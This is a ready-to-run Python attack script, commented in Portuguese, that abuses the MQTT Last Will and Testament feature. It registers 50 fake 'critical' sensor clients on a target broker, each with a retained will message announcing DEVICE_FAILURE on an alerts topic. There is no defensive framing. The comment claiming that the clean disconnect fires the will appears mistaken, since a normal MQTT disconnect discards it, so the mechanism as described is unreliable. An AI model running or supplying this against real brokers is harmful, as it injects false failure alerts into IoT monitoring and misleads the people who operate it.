#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import time

def lwt_abuse_attack(broker, client_num):
    client = mqtt.Client(client_id=f"critical_sensor_{client_num}")
    
    # Configura Last Will falso para parecer dispositivo crítico
    lwt_message = f'{{"device":"sensor_{client_num}","status":"DEVICE_FAILURE","battery":0}}'
    client.will_set("alerts/device/failure", lwt_message, qos=2, retain=True)
    
    # Conecta e desconecta abruptamente para disparar LWT
    client.connect(broker, 1883, 60)
    time.sleep(0.5)
    client.disconnect()  # Dispara Last Will Testament
    
    print(f"[!] LWT triggered for fake device: critical_sensor_{client_num}")

if __name__ == "__main__":
    import sys
    broker = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    
    # Cria 50 dispositivos "críticos" falsos que morrem
    for i in range(50):
        lwt_abuse_attack(broker, i)
        time.sleep(0.1)
    
    print("[✓] Last Will Testament abuse completed")